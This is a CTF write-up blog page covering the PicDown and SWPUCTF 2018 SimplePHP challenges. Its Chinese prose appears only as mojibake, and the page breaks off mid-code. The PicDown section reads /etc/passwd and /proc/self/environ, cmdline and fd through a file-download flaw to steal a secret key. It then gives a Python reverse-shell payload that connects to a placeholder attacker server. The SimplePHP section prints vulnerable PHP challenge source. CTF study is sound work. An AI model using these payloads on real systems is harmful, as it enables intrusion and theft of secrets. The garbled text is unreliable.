ç™½è™ç»„]PicDown</h2><p>PicDownï¼Œä¸‹è½½ç…§ç‰‡ï¼Œå°è¯•è®¿é—®/etc/passwdä¸‹è½½æˆåŠŸï¼Œçœ‹æ¥å¯ä»¥æ‰¾æ‰¾æºç ï¼Œæ²¡å•¥æ–‡ä»¶åŒ…å«æ€è·¯ï¼Œçœ‹wpï¼Œæ˜¯linuxçš„è¿›ç¨‹æ–‡ä»¶</p><blockquote><p>å¯ä»¥é€šè¿‡/proc/pid/ æ¥ è· å– æŒ‡ å®š è¿› ç¨‹ çš„ ä¿¡ æ¯ ï¼Œ ä¾‹ å¦‚ å†… å­˜ æ˜  å°„ ã€ CPUç»‘ å®š ä¿¡ æ¯ ç­‰ ç­‰ ã€‚ å¦‚ æœ æŸ ä¸ª è¿› ç¨‹ æƒ³ è¦ è· å– æœ¬ è¿› ç¨‹ çš„ ç³» ç»Ÿ ä¿¡ æ¯ ï¼Œ å°± å¯ ä»¥ é€š è¿‡ è¿› ç¨‹ çš„pidæ¥ è®¿ é—® /proc/ pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚</p></blockquote><p>å…¶ä¸­çš„é‡è¦æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">cmdlinecmdline æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼šcwdcwdæ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cwdæ–‡ä»¶è·å–ç›®æ ‡æŒ‡å®šè¿›ç¨‹ç¯å¢ƒçš„è¿è¡Œç›®å½•environenvironæ–‡ä»¶å­˜å‚¨ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼Œå˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹environç›®å½•æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯fdfdæ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢åŒ…å«ç€å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦ï¼ˆfile descriptorï¼‰å·®ä¸å¤šå°±æ˜¯è·¯å¾„å•¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·è¿æ¥ï¼Œå³æ¯ä¸ªé€šè¿‡è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡fdç›®å½•çš„æ–‡ä»¶è·å–è¿›ç¨‹ï¼Œä»è€Œæ‰“å¼€æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨</p><pre class="line-numbers language-none"><code class="language-none">1.è·å–å½“å‰å¯åŠ¨è¿›ç¨‹çš„å®Œæˆå‘½ä»¤ï¼šcat &#x2F;proc&#x2F;self&#x2F;cmdline2.è·å–ç›®æ ‡å½“å‰è¿›ç¨‹çš„è¿è¡Œç›®å½•ä¸ç›®å½•é‡Œçš„æ–‡ä»¶ï¼šls -al &#x2F;proc&#x2F;self&#x2F;cwdls &#x2F;proc&#x2F;self&#x2F;cwd3.è·å¾—å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼šls -al &#x2F;proc&#x2F;self&#x2F;exe3.è·å¾—å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼šls -al &#x2F;proc&#x2F;self&#x2F;exe4.è·å–å½“å‰ç¯å¢ƒå˜é‡cat &#x2F;proc&#x2F;self&#x2F;environ5.è·å–å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶å†…å®¹cat &#x2F;proc&#x2F;self&#x2F;fd&#x2F;&#123;id&#125;ä¹Ÿå¯ä»¥æ˜¯ï¼šcat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;*    --*å¯ä»¥ä»£æ›¿ä»»æ„æ•°å­—å’Œå­—æ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜ä¸­æˆ‘ä»¬å¯ä»¥è®¿é—®ä¸€ä¸‹è¿™å‡ ä¸ªä½ç½®</p><pre class="line-numbers language-none"><code class="language-none">cmdlinepython2 app.pyenvironMAIL&#x3D;&#x2F;var&#x2F;mail&#x2F;appUSER&#x3D;appHOME&#x3D;&#x2F;home&#x2F;appLOGNAME&#x3D;appPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;gamesSHELL&#x3D;&#x2F;bin&#x2F;shPWD&#x3D;&#x2F;app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿è¡Œä½ç½®æ‹¿åˆ°æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#/proc/self/cwd/app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> os<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­æ‰“å¼€äº†<code>/tmp/secret.txt</code>å¹¶ä¸”å°†å…¶ä¸­çš„å†…å®¹ä½œä¸ºSECRET_KEYï¼Œæ‰€ä»¥æˆ‘ä»¬è®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶å°±è¡Œäº†ï¼Œå°è¯•ç›´æ¥è¯»å–å‘ç°å¤±è´¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨procæ–‡ä»¶ä¸­çš„fdæ–‡ä»¶å¤¹ï¼Œidä»1å¼€å§‹å°è¯•ï¼Œæœ€ç»ˆå¯ä»¥æ‹¿åˆ°è¯¥æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">url&#x3D;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å°è¯•ä¼ å‚ï¼ŒæˆåŠŸï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡ŒæˆåŠŸåå´æ²¡æœ‰å›æ˜¾ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åå¼¹shellæˆ–è€…å†™æ–‡ä»¶</p><p>åå¼¹shell</p><pre class="line-numbers language-none"><code class="language-none">payload:key&#x3D;p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM&#x3D;&amp;shell&#x3D;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;æœåŠ¡å™¨IPå–µå–µ&quot;,ç›‘å¬ç«¯å£å–µå–µ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><del>éªšæ“ä½œç›´æ¥è®¿é—®/flagä¸‹è½½æ–‡ä»¶</del></p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>æŸ¥çœ‹æ–‡ä»¶å¤„å¯ä»¥æŸ¥çœ‹é¡µé¢æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//file.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//function.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token string double-quoted-string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">unlink</span><span class="token 